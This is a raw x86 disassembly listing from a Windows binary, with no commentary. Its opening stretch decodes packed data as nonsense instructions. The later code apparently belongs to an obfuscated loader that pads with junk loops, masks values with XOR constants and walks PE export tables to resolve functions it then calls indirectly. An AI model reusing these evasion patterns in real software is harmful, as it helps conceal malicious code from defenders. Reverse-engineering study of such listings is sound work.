  407e6f:	arpl   WORD PTR [edx],bx
  407e71:	dec    ebp
  407e72:	dec    ebx
  407e73:	adc    eax,0xe88f6482
  407e78:	nop
  407e79:	(bad)  [ecx-0x3e]
  407e7c:	cmp    cl,BYTE PTR ds:0x6bca6af6
  407e82:	add    eax,0x529fa28e
  407e87:	xchg   ecx,eax
  407e88:	add    DWORD PTR [eax+eiz*1-0x4888f62a],0x3f
  407e90:	and    ch,al
  407e92:	pop    ebp
  407e93:	pop    edx
  407e94:	add    BYTE PTR [edx+0x232f5a8e],0x72
  407e9b:	sub    DWORD PTR [edi],edi
  407e9d:	xor    edx,ecx
  407e9f:	lahf   
  407ea0:	inc    edx
  407ea1:	cmp    DWORD PTR [ebx],0xffffffec
  407ea4:	mov    DWORD PTR [edi],esi
  407ea6:	mov    al,0x5d
  407ea8:	dec    edx
  407ea9:	fdiv   DWORD PTR [edi]
  407eab:	cmp    ebp,DWORD PTR [edx+edi*4]
  407eae:	jle    0x407eb6
  407eb0:	jbe    0x407e95
  407eb2:	outs   dx,BYTE PTR ds:[esi]
  407eb3:	xchg   ebp,eax
  407eb4:	cs rcr esi,cl
  407eb7:	leave  
  407eb8:	test   DWORD PTR [ecx],edi
  407eba:	out    0xbf,al
  407ebc:	add    BYTE PTR [ecx-0x2ecea783],bh
  407ec2:	sub    esp,DWORD PTR [ebx+0x788b8446]
  407ec8:	mov    edi,0x606de68d
  407ecd:	and    eax,0x19f24d04
  407ed2:	shr    BYTE PTR [esi-0x25c6a5a9],cl
  407ed8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407ed9:	pusha  
  407eda:	test   al,0x74
  407edc:	push   esp
  407edd:	out    0x65,eax
  407edf:	mov    eax,0x9fbae2c2
  407ee4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407ee5:	xor    BYTE PTR [edx],cl
  407ee7:	shr    DWORD PTR ds:[esi-0x201cbf6f],cl
  407eee:	es aas 
  407ef0:	ret    
  407ef1:	mov    edx,0x49c04808
  407ef6:	out    dx,eax
  407ef7:	xlat   BYTE PTR ds:[ebx]
  407ef8:	sub    eax,0xc2c013e1
  407efd:	fiadd  DWORD PTR [ebx]
  407eff:	nop
  407f00:	cmp    al,0x7b
  407f02:	shl    DWORD PTR [eax+0x73],cl
  407f05:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407f06:	sbb    BYTE PTR [edx-0x70f0e9d7],bh
  407f0c:	add    al,BYTE PTR [ebx+0x2c]
  407f0f:	mov    al,0x8f
  407f11:	in     al,0x9e
  407f13:	or     al,BYTE PTR [esp+ebx*8-0x79566ef8]
  407f1a:	lahf   
  407f1b:	test   eax,0x4eab0914
  407f20:	mov    WORD PTR [ecx-0x5f],?
  407f23:	pusha  
  407f24:	cld    
  407f25:	rcl    BYTE PTR [esi],0xae
  407f28:	and    esi,DWORD PTR [edx-0x5484a26b]
  407f2e:	jno    0x407eef
  407f30:	xchg   ebx,eax
  407f31:	out    dx,al
  407f32:	fnstcw WORD PTR [eax]
  407f34:	not    BYTE PTR [ecx+0x13512a27]
  407f3a:	pusha  
  407f3b:	fdivr  DWORD PTR [ecx-0x1a35f2e7]
  407f41:	enter  0x8e0f,0x61
  407f45:	dec    edx
  407f46:	mov    dh,0x86
  407f48:	clc    
  407f49:	push   esp
  407f4a:	sub    BYTE PTR [edi-0xf15b7bb],dl
  407f50:	test   ah,0xcf
  407f53:	gs push ebp
  407f55:	xor    BYTE PTR [edx-0x75ecaf0d],0x46
  407f5c:	push   es
  407f5d:	xchg   esi,eax
  407f5e:	sub    dl,BYTE PTR [edx-0x4824a207]
  407f64:	push   cs
  407f65:	out    0x62,al
  407f67:	mov    eax,ds:0x3cdf815f
  407f6c:	and    eax,0x2d96d069
  407f71:	imul   edx,DWORD PTR [esi+0x2a],0x31
  407f75:	mov    ds,WORD PTR [eax+0x60de24d7]
  407f7b:	(bad)  
  407f7c:	xor    esi,edi
  407f7e:	sub    cl,al
  407f80:	adc    BYTE PTR [edi-0x75eecc86],bh
  407f86:	fisttp DWORD PTR [edi-0x5b822c6]
  407f8c:	cmp    BYTE PTR [ebx-0x647b71fc],bh
  407f92:	sub    BYTE PTR [esi],ch
  407f94:	inc    ecx
  407f95:	push   esi
  407f96:	xchg   ebx,eax
  407f97:	mov    cl,0x99
  407f99:	lock rcl ebx,1
  407f9c:	push   esp
  407f9d:	push   ss
  407f9e:	mov    edi,0x4ed28854
  407fa3:	fwait
  407fa4:	test   DWORD PTR [eax],edi
  407fa6:	sub    ch,cl
  407fa8:	mov    esp,0x27e3c08a
  407fad:	out    dx,eax
  407fae:	mov    dl,0x62
  407fb0:	and    DWORD PTR [edi+0x56],ebx
  407fb3:	mov    cl,BYTE PTR ds:0xbca501dc
  407fb9:	add    ch,0x5a
  407fbc:	push   esp
  407fbd:	loope  0x40800d
  407fbf:	push   ds
  407fc0:	cmp    dh,dl
  407fc2:	out    dx,eax
  407fc3:	xor    al,dl
  407fc5:	out    dx,eax
  407fc6:	icebp  
  407fc7:	out    dx,eax
  407fc8:	les    ecx,FWORD PTR gs:[eax-0x89b660e]
  407fcf:	sbb    al,0x1d
  407fd1:	or     al,BYTE PTR [eax]
  407fd3:	sbb    eax,DWORD PTR [edi-0x700cc938]
  407fd9:	fadd   DWORD PTR [esi+eiz*2-0x62]
  407fdd:	xlat   BYTE PTR ds:[ebx]
  407fde:	inc    edi
  407fdf:	out    0x8c,al
  407fe1:	mov    al,ds:0x414b393f
  407fe6:	dec    ecx
  407fe7:	arpl   bx,bx
  407fe9:	inc    ebp
  407fea:	sub    bh,BYTE PTR [eax-0x63c2f43]
  407ff0:	shl    DWORD PTR [edx+ebx*4+0x4f],0x8d
  407ff5:	sub    al,0xce
  407ff7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407ff8:	sbb    DWORD PTR [ecx+0x41],0xa49461d8
  407fff:	pop    edx
  408000:	cs cmp al,0x8f
  408003:	sbb    DWORD PTR ds:0xfc15172a,ebx
  408009:	mov    eax,0xf4b9b31f
  40800e:	in     al,0x54
  408010:	sub    bl,ch
  408012:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408013:	jge    0x407f98
  408015:	jp     0x6e950ecf
  40801b:	cmp    eax,0x871046f5
  408020:	loope  0x407fc8
  408022:	sbb    dh,BYTE PTR [edi+edi*2-0x75]
  408026:	cmp    esi,DWORD PTR [ebx]
  408028:	(bad)  
  408029:	mov    ah,bl
  40802b:	ror    DWORD PTR [edi],cl
  40802d:	fnstcw WORD PTR [ebx+0x509252c2]
  408033:	xchg   esp,eax
  408034:	jecxz  0x408048
  408036:	cmp    eax,0xae23b00
  40803b:	jmp    0xa70c:0x2bf5371b
  408042:	icebp  
  408043:	mov    esi,0x7a0d38f6
  408048:	xlat   BYTE PTR ds:[ebx]
  408049:	mov    ch,0x31
  40804b:	scas   al,BYTE PTR es:[edi]
  40804c:	mov    ecx,0x3ac41857
  408051:	nop
  408052:	retf   
  408053:	jg     0x40801d
  408055:	pushf  
  408056:	mov    al,0xd0
  408058:	dec    eax
  408059:	lods   al,BYTE PTR ds:[esi]
  40805a:	js     0x4080b4
  40805c:	outs   dx,DWORD PTR ds:[esi]
  40805d:	xchg   esp,eax
  40805e:	aaa    
  40805f:	pusha  
  408060:	fisubr WORD PTR [ebp-0x6a91c77b]
  408066:	shl    BYTE PTR [eax+edi*1],cl
  408069:	add    edx,DWORD PTR [edx]
  40806b:	test   DWORD PTR [ecx],esp
  40806d:	mov    ecx,0x3f8defb1
  408072:	ficom  WORD PTR [ebx-0x18]
  408075:	push   ds
  408076:	inc    edx
  408077:	mov    ds:0xc2b58ffd,al
  40807c:	cmp    eax,0x12796bb6
  408081:	out    0x59,eax
  408083:	and    edi,DWORD PTR [eax]
  408085:	jg     0x408081
  408087:	jecxz  0x408108
  408089:	dec    ebp
  40808a:	and    al,0x6f
  40808c:	mov    edi,0xcc90b7c4
  408091:	dec    esp
  408092:	repnz ror BYTE PTR [edx+0x6c7193f6],0xd6
  40809a:	fsub   QWORD PTR [edi+0x73]
  40809d:	mov    ebp,0xe62b8f4c
  4080a2:	enter  0x4363,0x24
  4080a6:	mov    bh,0xe1
  4080a8:	xor    ecx,DWORD PTR [eax-0x63925b96]
  4080ae:	adc    BYTE PTR [esi+0x1a],bh
  4080b1:	jmp    0xc8b9:0x9402b708
  4080b8:	jo     0x40810b
  4080ba:	jns    0x408102
  4080bc:	or     eax,ebx
  4080be:	xchg   edi,eax
  4080bf:	push   ecx
  4080c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4080c1:	jnp    0x40804a
  4080c3:	scas   eax,DWORD PTR es:[edi]
  4080c4:	push   ebx
  4080c5:	mov    bl,0x80
  4080c7:	into   
  4080c8:	int3   
  4080c9:	(bad)  
  4080cb:	sub    BYTE PTR [eax+0x90429],dh
  4080d1:	adc    al,0x5b
  4080d3:	jg     0x408122
  4080d5:	sub    dl,al
  4080d7:	adc    dh,bh
  4080d9:	xor    eax,0xf52f0558
  4080de:	cmp    bl,BYTE PTR [edx+0x45afc9b7]
  4080e4:	inc    esp
  4080e5:	inc    esp
  4080e6:	out    dx,al
  4080e7:	and    bl,BYTE PTR [eax]
  4080e9:	ret    0xc18b
  4080ec:	aad    0x61
  4080ee:	pushf  
  4080ef:	push   ecx
  4080f0:	or     bl,0x29
  4080f3:	and    al,0x77
  4080f5:	inc    ebp
  4080f6:	push   ds
  4080f7:	mov    es,WORD PTR [edi]
  4080f9:	stos   BYTE PTR es:[edi],al
  4080fa:	xchg   ebp,eax
  4080fb:	push   0xfa08348b
  408100:	xlat   BYTE PTR ds:[ebx]
  408101:	xchg   ebp,eax
  408102:	hlt    
  408103:	cmp    ecx,edi
  408105:	ins    DWORD PTR es:[edi],dx
  408106:	inc    edi
  408107:	push   edi
  408108:	test   BYTE PTR [ecx],bl
  40810a:	mov    ah,dh
  40810c:	add    bh,BYTE PTR [ebp+0x4a1d121d]
  408112:	mov    ecx,0x2bfb95bb
  408117:	jno    0x408180
  408119:	pop    ebx
  40811a:	jle    0x4080d5
  40811c:	or     edi,DWORD PTR [edi]
  40811e:	push   es
  40811f:	(bad)  
  408120:	loopne 0x4080e3
  408122:	call   0xe20213ef
  408127:	push   ebp
  408128:	cs scas al,BYTE PTR es:[edi]
  40812a:	cmp    DWORD PTR [ebx],esp
  40812c:	test   DWORD PTR [edi+ebp*1-0x6f],ebx
  408130:	std    
  408131:	push   cs
  408132:	daa    
  408133:	xchg   edx,eax
  408134:	xor    DWORD PTR [eax+0x5e],esp
  408137:	add    bh,BYTE PTR [edi+0x4b]
  40813a:	or     bh,BYTE PTR [edi+eax*1]
  40813d:	inc    edi
  40813e:	sbb    ecx,DWORD PTR [edi-0x6d]
  408141:	push   esi
  408142:	daa    
  408143:	bound  ebx,QWORD PTR [ecx-0x52]
  408146:	xlat   BYTE PTR gs:[ebx]
  408148:	mov    ecx,0x4b955cb
  40814d:	loop   0x4081b7
  40814f:	jge    0x408144
  408151:	mov    bh,0x26
  408153:	test   BYTE PTR [ecx-0x13],al
  408156:	test   BYTE PTR [ebx+0x38],0x63
  40815a:	push   es
  40815b:	shr    DWORD PTR [edx+0x2c],cl
  40815e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40815f:	imul   ecx,DWORD PTR [eax],0x8
  408162:	pop    es
  408163:	or     bl,BYTE PTR [esi]
  408165:	adc    DWORD PTR [edi],esi
  408167:	shr    DWORD PTR [edi],cl
  408169:	jb     0x408168
  40816b:	cmp    edx,DWORD PTR [edx]
  40816d:	enter  0x2a5a,0x2e
  408171:	cmp    edx,DWORD PTR [ecx]
  408173:	retf   0x8ebf
  408176:	push   es
  408177:	fstp   TBYTE PTR [edx+0x4f3c909e]
  40817d:	xchg   ebp,eax
  40817e:	arpl   WORD PTR [ebp-0x2a7eb8fc],ax
  408184:	shr    BYTE PTR [edx],cl
  408186:	push   ds
  408187:	xor    al,0x3b
  408189:	mov    al,0x95
  40818b:	test   al,0x5c
  40818d:	sub    al,0x4
  40818f:	or     dh,bh
  408191:	retf   
  408192:	jns    0x408206
  408194:	stc    
  408195:	xchg   ecx,eax
  408196:	mov    ah,0xe7
  408198:	sub    dh,BYTE PTR [esi]
  40819a:	adc    al,0xde
  40819c:	xchg   esi,ecx
  40819e:	xor    DWORD PTR ds:0x42801c,edi
  4081a4:	mov    edi,0x155c
  4081a9:	sub    edx,edi
  4081ab:	and    DWORD PTR ds:0x42901c,0x60c1
  4081b5:	mov    ecx,DWORD PTR [ebp-0x4]
  4081b8:	xor    ecx,ebx
  4081ba:	and    DWORD PTR ds:0x42b014,0x0
  4081c4:	mov    esi,DWORD PTR ds:0x42b014
  4081ca:	inc    esi
  4081cb:	mov    DWORD PTR ds:0x42b014,esi
  4081d1:	cmp    DWORD PTR ds:0x42b014,0x10
  4081d8:	jne    0x4081e9
  4081de:	push   0x4234e2
  4081e3:	call   DWORD PTR ds:0x424044
  4081e9:	cmp    DWORD PTR ds:0x42b014,0xf
  4081f0:	jne    0x408203
  4081f6:	mov    esi,DWORD PTR ds:0x42b014
  4081fc:	inc    esi
  4081fd:	mov    DWORD PTR ds:0x42b014,esi
  408203:	cmp    DWORD PTR ds:0x42b014,0x1b
  40820a:	jb     0x4081c4
  408210:	add    ecx,eax
  408212:	sbb    esi,0x766b
  408218:	mov    DWORD PTR [ebp-0x8],ecx
  40821b:	and    esi,0x21f
  408221:	mov    ecx,DWORD PTR [ebp-0x14]
  408224:	mov    DWORD PTR ds:0x42b000,0x19
  40822e:	cmp    DWORD PTR ds:0x42b000,0x0
  408235:	je     0x40828f
  40823b:	cmp    DWORD PTR ds:0x42b000,0x4
  408242:	jne    0x40825b
  408248:	push   DWORD PTR [ebp-0x1c]
  40824b:	push   0x429018
  408250:	push   0x42374e
  408255:	call   DWORD PTR ds:0x424048
  40825b:	cmp    DWORD PTR ds:0x42b000,0x5
  408262:	jne    0x408275
  408268:	mov    esi,DWORD PTR ds:0x42b000
  40826e:	dec    esi
  40826f:	mov    DWORD PTR ds:0x42b000,esi
  408275:	xor    esi,esi
  408277:	add    esi,DWORD PTR ds:0x42b000
  40827d:	dec    esi
  40827e:	mov    DWORD PTR ds:0x42b000,esi
  408284:	jmp    0x40822e
  408289:	and    esi,0x686c
  40828f:	xor    ecx,ebx
  408291:	add    ecx,eax
  408293:	mov    DWORD PTR [ebp-0x24],ecx
  408296:	adc    esi,ecx
  408298:	mov    ecx,DWORD PTR [ebp-0x4]
  40829b:	and    DWORD PTR ds:0x428014,0x0
  4082a5:	jmp    0x4082b7
  4082aa:	mov    esi,DWORD PTR ds:0x428014
  4082b0:	inc    esi
  4082b1:	mov    DWORD PTR ds:0x428014,esi
  4082b7:	cmp    DWORD PTR ds:0x428014,0x14
  4082be:	jae    0x4082ea
  4082c4:	cmp    DWORD PTR ds:0x428014,0x1d
  4082cb:	jne    0x4082df
  4082d1:	push   0x42b01c
  4082d6:	push   DWORD PTR [ebp-0xc]
  4082d9:	call   DWORD PTR ds:0x424014
  4082df:	jmp    0x4082aa
  4082e4:	xor    DWORD PTR ds:0x428018,ecx
  4082ea:	xor    ecx,ebx
  4082ec:	add    ecx,eax
  4082ee:	add    DWORD PTR ds:0x428004,edx
  4082f4:	mov    DWORD PTR [ebp-0x30],ecx
  4082f7:	adc    DWORD PTR ds:0x42b01c,edi
  4082fd:	mov    esi,DWORD PTR [ebp-0x4]
  408300:	xor    DWORD PTR ds:0x42800c,0x2f0f
  40830a:	xor    esi,ebx
  40830c:	and    DWORD PTR ds:0x429018,0x0
  408316:	mov    ecx,DWORD PTR ds:0x429018
  40831c:	inc    ecx
  40831d:	mov    DWORD PTR ds:0x429018,ecx
  408323:	cmp    DWORD PTR ds:0x429018,0x13
  40832a:	jne    0x408358
  408330:	push   DWORD PTR [ebp-0x18]
  408333:	push   0x42b018
  408338:	push   0x8bc1
  40833d:	push   0x42a018
  408342:	push   0x81c2
  408347:	push   DWORD PTR [ebp-0x18]
  40834a:	push   0x8630
  40834f:	push   DWORD PTR [ebp-0x28]
  408352:	call   DWORD PTR ds:0x424018
  408358:	cmp    DWORD PTR ds:0x429018,0x10
  40835f:	jb     0x408316
  408365:	movzx  ecx,WORD PTR ds:0x429008
  40836c:	sub    ecx,DWORD PTR ds:0x42a010
  408372:	mov    DWORD PTR ds:0x429008,ecx
  408378:	add    esi,eax
  40837a:	mov    ecx,DWORD PTR [ebp-0x24]
  40837d:	sub    ecx,eax
  40837f:	lea    edx,[esi-0x3272db]
  408385:	xor    DWORD PTR ds:0x428008,0x428000
  40838f:	xor    ecx,ebx
  408391:	sub    DWORD PTR ds:0x42c01c,0x42b01c
  40839b:	xor    edx,ebx
  40839d:	cmp    edx,ecx
  40839f:	mov    DWORD PTR ds:0x428000,0x76f
  4083a9:	je     0x408631
  4083af:	xor    DWORD PTR ds:0x42c010,edx
  4083b5:	mov    ecx,DWORD PTR [ebp-0x4]
  4083b8:	xor    ecx,ebx
  4083ba:	or     DWORD PTR ds:0x429014,0x42a01c
  4083c4:	add    ecx,eax
  4083c6:	cmp    esi,ecx
  4083c8:	mov    DWORD PTR ds:0x42a01c,0x739d
  4083d2:	jne    0x40860e
  4083d8:	add    DWORD PTR ds:0x42a00c,0x429004
  4083e2:	push   DWORD PTR [ebp+0x8]
  4083e5:	call   0x408a39
  4083ea:	mov    DWORD PTR [ebp-0x18],eax
  4083ed:	mov    eax,DWORD PTR [ebp-0x4]
  4083f0:	mov    DWORD PTR ds:0x42c00c,0x1d
  4083fa:	cmp    DWORD PTR ds:0x42c00c,0x0
  408401:	je     0x408435
  408407:	cmp    DWORD PTR ds:0x42c00c,0x21
  40840e:	jne    0x40841d
  408414:	push   DWORD PTR [ebp-0xc]
  408417:	call   DWORD PTR ds:0x42401c
  40841d:	mov    edi,DWORD PTR ds:0x42c00c
  408423:	dec    edi
  408424:	mov    DWORD PTR ds:0x42c00c,edi
  40842a:	jmp    0x4083fa
  40842f:	adc    ecx,DWORD PTR ds:0x428008
  408435:	mov    ecx,DWORD PTR [ebp-0x18]
  408438:	and    DWORD PTR ds:0x42b01c,0x0
  408442:	mov    edi,DWORD PTR ds:0x42b01c
  408448:	inc    edi
  408449:	mov    DWORD PTR ds:0x42b01c,edi
  40844f:	cmp    DWORD PTR ds:0x42b01c,0x23
  408456:	jne    0x408468
  40845c:	push   DWORD PTR [ebp-0x14]
  40845f:	push   DWORD PTR [ebp-0x28]
  408462:	call   DWORD PTR ds:0x424020
  408468:	cmp    DWORD PTR ds:0x42b01c,0x19
  40846f:	jb     0x408442
  408475:	xor    eax,ebx
  408477:	add    DWORD PTR ds:0x429018,0x397c
  408481:	mov    edi,0x3272db
  408486:	sub    DWORD PTR ds:0x428020,0x386b
  408490:	add    eax,edi
  408492:	mov    DWORD PTR ds:0x42900c,0x67dc
  40849c:	cmp    ecx,eax
  40849e:	mov    DWORD PTR ds:0x42c00c,0x661b
  4084a8:	je     0x4086a1
  4084ae:	push   DWORD PTR [ebp-0x18]
  4084b1:	sub    DWORD PTR ds:0x42800c,0x42a014
  4084bb:	push   DWORD PTR [ebp+0x8]
  4084be:	and    DWORD PTR ds:0x42b000,0x429010
  4084c8:	call   0x419246
  4084cd:	sub    ecx,DWORD PTR ds:0x42a00c
  4084d3:	mov    DWORD PTR [ebp-0x18],eax
  4084d6:	xor    eax,eax
  4084d8:	xor    eax,DWORD PTR ds:0x42a01c
  4084de:	xor    DWORD PTR ds:0x428018,eax
  4084e4:	mov    eax,DWORD PTR [ebp-0x4]
  4084e7:	mov    ecx,DWORD PTR [ebp-0x18]
  4084ea:	xor    eax,ebx
  4084ec:	add    eax,edi
  4084ee:	cmp    ecx,eax
  4084f0:	je     0x4086a1
  4084f6:	mov    ecx,DWORD PTR ds:0x429010
  4084fc:	add    DWORD PTR ds:0x42a010,ecx
  408502:	mov    eax,DWORD PTR [ebp-0x18]
  408505:	and    DWORD PTR ds:0x42a008,0x0
  40850f:	jmp    0x408521
  408514:	mov    ecx,DWORD PTR ds:0x42a008
  40851a:	inc    ecx
  40851b:	mov    DWORD PTR ds:0x42a008,ecx
  408521:	cmp    DWORD PTR ds:0x42a008,0x14
  408528:	jae    0x4085ac
  40852e:	cmp    DWORD PTR ds:0x42a008,0x1f
  408535:	jne    0x408563
  40853b:	push   0x42b010
  408540:	push   DWORD PTR [ebp-0x10]
  408543:	push   0x4f72
  408548:	push   0x42900c
  40854d:	push   DWORD PTR [ebp-0x24]
  408550:	push   0x42366e
  408555:	push   DWORD PTR [ebp-0x1c]
  408558:	push   0x3544
  40855d:	call   DWORD PTR ds:0x424024
  408563:	jmp    0x408514
  408568:	and    DWORD PTR ds:0x428020,0x0
  408572:	mov    ecx,DWORD PTR ds:0x428020
  408578:	inc    ecx
  408579:	mov    DWORD PTR ds:0x428020,ecx
  40857f:	cmp    DWORD PTR ds:0x428020,0x1a
  408586:	jne    0x40859f
  40858c:	push   DWORD PTR [ebp-0x1c]
  40858f:	push   0x561b
  408594:	push   0x3276
  408599:	call   DWORD PTR ds:0x424028
  40859f:	cmp    DWORD PTR ds:0x428020,0x17
  4085a6:	jb     0x408572
  4085ac:	mov    eax,DWORD PTR [eax+0x18]
  4085af:	mov    DWORD PTR [ebp-0x24],eax
  4085b2:	xor    eax,eax
  4085b4:	mov    eax,DWORD PTR [ebp-0x18]
  4085b7:	mov    ecx,DWORD PTR [ebp+0x8]
  4085ba:	add    DWORD PTR ds:0x42901c,0x480
  4085c4:	add    ecx,DWORD PTR [eax+0x20]
  4085c7:	mov    DWORD PTR [ebp-0x2c],ecx
  4085ca:	sub    DWORD PTR ds:0x42c00c,ebx
  4085d0:	mov    eax,DWORD PTR [ebp-0x18]
  4085d3:	mov    ecx,DWORD PTR [ebp+0x8]
  4085d6:	add    DWORD PTR ds:0x42a004,0x42a01c
  4085e0:	add    ecx,DWORD PTR [eax+0x24]
  4085e3:	mov    DWORD PTR [ebp-0x34],ecx
  4085e6:	inc    ecx
  4085e7:	mov    eax,DWORD PTR [ebp-0x18]
  4085ea:	sub    DWORD PTR ds:0x42b010,0x20b8
  4085f4:	mov    ecx,DWORD PTR [ebp+0x8]
  4085f7:	or     DWORD PTR ds:0x42a010,0x1874
  408601:	add    ecx,DWORD PTR [eax+0x1c]
  408604:	mov    eax,edi
  408606:	mov    DWORD PTR [ebp-0x18],ecx
  408609:	jmp    0x408669
  40860e:	mov    ecx,DWORD PTR [ebp-0x2c]
  408611:	mov    edx,DWORD PTR [ebp+0x8]
  408614:	add    edx,DWORD PTR [ecx+esi*4]
  408617:	mov    DWORD PTR [ebp-0x28],edx
  40861a:	mov    ecx,DWORD PTR [ebp-0x4]
  40861d:	mov    edx,DWORD PTR [ebp-0x28]
  408620:	xor    ecx,ebx
  408622:	add    ecx,eax
  408624:	cmp    edx,ecx
  408626:	je     0x408669
  40862c:	jmp    0x408655
  408631:	mov    ecx,DWORD PTR [ebp-0x4]
  408634:	mov    edx,DWORD PTR [ebp-0x8]
  408637:	xor    ecx,ebx
  408639:	add    ecx,eax
  40863b:	cmp    edx,ecx
  40863d:	je     0x4086ad
  408643:	mov    ecx,DWORD PTR [ebp-0x4]
  408646:	mov    edx,DWORD PTR [ebp-0x30]
  408649:	xor    ecx,ebx
  40864b:	add    ecx,eax
  40864d:	cmp    edx,ecx
  40864f:	je     0x4086bc
  408655:	lea    eax,[ebp-0x8]
  408658:	push   eax
  408659:	push   DWORD PTR [ebp-0x28]
  40865c:	push   DWORD PTR [ebp+0xc]
  40865f:	call   0x419e00
  408664:	mov    eax,0x3272db
  408669:	mov    ecx,DWORD PTR [ebp-0x4]
  40866c:	mov    edx,DWORD PTR [ebp-0x8]
  40866f:	xor    ecx,ebx
  408671:	add    ecx,eax
  408673:	cmp    edx,ecx
  408675:	je     0x408690
  40867b:	mov    ecx,DWORD PTR [ebp-0x34]
  40867e:	movzx  ecx,WORD PTR [ecx+esi*2]
  408682:	mov    edx,DWORD PTR [ebp-0x18]
  408685:	mov    ecx,DWORD PTR [edx+ecx*4]
  408688:	mov    DWORD PTR [ebp-0x38],ecx
  40868b:	jmp    0x408631
  408690:	mov    ecx,DWORD PTR [ebp-0x14]
  408693:	xor    ecx,ebx
  408695:	lea    esi,[esi+ecx*1+0x3272db]
  40869c:	jmp    0x40837a
  4086a1:	mov    eax,DWORD PTR [ebp-0x4]
  4086a4:	xor    eax,ebx
  4086a6:	add    eax,edi
  4086a8:	jmp    0x408820
  4086ad:	mov    eax,DWORD PTR [ebp-0x4]
  4086b0:	xor    eax,ebx
  4086b2:	add    eax,0x3272db
  4086b7:	jmp    0x408820
  4086bc:	mov    ecx,DWORD PTR [ebp-0x38]
  4086bf:	add    ecx,DWORD PTR [ebp+0x8]
  4086c2:	mov    DWORD PTR [ebp-0x10],ecx
  4086c5:	mov    ecx,DWORD PTR [ebp-0x1c]
  4086c8:	test   ecx,ecx
  4086ca:	je     0x4087ab
  4086d0:	mov    DWORD PTR [ebp-0x20],0x0
  4086d7:	push   0x3
  4086d9:	xor    edx,edx
  4086db:	pop    edx
  4086dc:	add    edx,0x8
  4086df:	push   edx
  4086e0:	pop    ecx
  4086e1:	push   0x6
  4086e3:	dec    ecx
  4086e4:	pop    ebx
  4086e5:	dec    ebx
  4086e6:	xchg   ebx,ecx
  4086e8:	sub    ebx,ecx
  4086ea:	xchg   ebx,ecx
  4086ec:	dec    ecx
  4086ed:	mov    eax,DWORD PTR [ebp-0x1c]
  4086f0:	imul   eax,ecx
  4086f3:	sub    esp,eax
  4086f5:	mov    DWORD PTR [ebp-0x20],esp
  4086f8:	mov    eax,DWORD PTR [ebp-0x4]
  4086fb:	mov    ecx,0x7510893
  408700:	xor    eax,ecx
  408702:	mov    edx,0x3272db
  408707:	add    eax,edx
  408709:	mov    DWORD PTR [ebp+0x8],eax
  40870c:	mov    eax,DWORD PTR [ebp-0x14]
  40870f:	xor    eax,ecx
  408711:	add    eax,edx
  408713:	mov    edx,DWORD PTR [ebp+0x14]
  408716:	imul   eax,DWORD PTR [edx]
  408719:	mov    edx,DWORD PTR [ebp-0x4]
  40871c:	xor    edx,ecx
  40871e:	mov    ecx,DWORD PTR [ebp+0x8]
  408721:	lea    ecx,[edx+ecx*1+0x3272db]
  408728:	cmp    ecx,eax
  40872a:	je     0x4087a1
  408730:	mov    edi,DWORD PTR [ebp-0x14]
  408733:	mov    eax,DWORD PTR [ebp+0x8]
  408736:	mov    edx,DWORD PTR [ebp+0x14]
  408739:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40873d:	mov    ecx,0x7510893
  408742:	xor    edx,edx
  408744:	xor    edi,ecx
  408746:	mov    esi,0x3272db
  40874b:	add    edi,esi
  40874d:	div    edi
  40874f:	mov    edx,DWORD PTR [ebp-0x4]
  408752:	xor    edx,ecx
  408754:	lea    eax,[edx+eax*1+0x3272db]
  40875b:	mov    edx,DWORD PTR [ebp+0x8]
  40875e:	mov    edi,DWORD PTR [ebp-0x20]
  408761:	mov    DWORD PTR [edi+edx*4],eax
  408764:	mov    eax,DWORD PTR [ebp-0x14]
  408767:	mov    edx,DWORD PTR [ebp+0x8]
  40876a:	xor    eax,ecx
  40876c:	lea    eax,[eax+edx*1+0x3272db]
  408773:	mov    DWORD PTR [ebp+0x8],eax
  408776:	mov    eax,DWORD PTR [ebp-0x14]
  408779:	mov    edx,DWORD PTR [ebp+0x14]
  40877c:	xor    eax,ecx
  40877e:	add    eax,esi
  408780:	imul   eax,DWORD PTR [edx]
  408783:	mov    edx,DWORD PTR [ebp-0x4]
  408786:	xor    edx,ecx
  408788:	mov    ecx,DWORD PTR [ebp+0x8]
  40878b:	lea    ecx,[edx+ecx*1+0x3272db]
  408792:	cmp    ecx,eax
  408794:	jne    0x408730
  40879a:	mov    eax,esi
  40879c:	jmp    0x4087a6
  4087a1:	mov    eax,0x3272db
  4087a6:	mov    ebx,0x7510893
  4087ab:	mov    ecx,DWORD PTR [ebp-0x4]
  4087ae:	xor    ecx,ebx
  4087b0:	add    ecx,eax
  4087b2:	mov    DWORD PTR [ebp-0xc],ecx
  4087b5:	mov    ebx,0x3874
  4087ba:	add    ebx,0x2342
  4087c0:	xchg   ebx,esi
  4087c2:	xor    ebx,ebx
  4087c4:	push   esi
  4087c5:	mov    esi,ebx
  4087c7:	pop    ebx
  4087c8:	mov    edx,esi
  4087ca:	add    ebx,0x1002
  4087d0:	lea    eax,[ebp-0x10]
  4087d3:	add    edx,eax
  4087d5:	add    edx,0x5
  4087d8:	push   edx
  4087d9:	inc    esi
  4087da:	pop    ecx
  4087db:	dec    ecx
  4087dc:	xchg   ecx,eax
  4087dd:	dec    eax
  4087de:	xchg   ecx,eax
  4087df:	dec    ecx
  4087e0:	xchg   ecx,edx
  4087e2:	dec    edx
  4087e3:	push   edx
  4087e4:	mov    edx,ebx
  4087e6:	pop    ebx
  4087e7:	dec    ebx
  4087e8:	call   DWORD PTR [ebx]
  4087ea:	cmp    DWORD PTR [ebp+0x10],esi
  4087ed:	je     0x40880c
  4087f3:	xchg   edx,eax
  4087f4:	push   0xb
  4087f6:	pop    ecx
  4087f7:	push   0x4
  4087f9:	pop    ebx
  4087fa:	inc    ebx
  4087fb:	xchg   ebx,ecx
  4087fd:	sub    ebx,ecx
  4087ff:	xchg   ebx,ecx
  408801:	dec    ecx
  408802:	dec    ecx
  408803:	mov    eax,DWORD PTR [ebp-0x1c]
  408806:	imul   eax,ecx
  408809:	add    esp,eax
  40880b:	xchg   edx,eax
  40880c:	push   eax
  40880d:	xor    ebx,ebx
  40880f:	mov    edx,esp
  408811:	dec    edx
  408812:	inc    ebx
  408813:	add    ebx,DWORD PTR [edx+ebx*1]
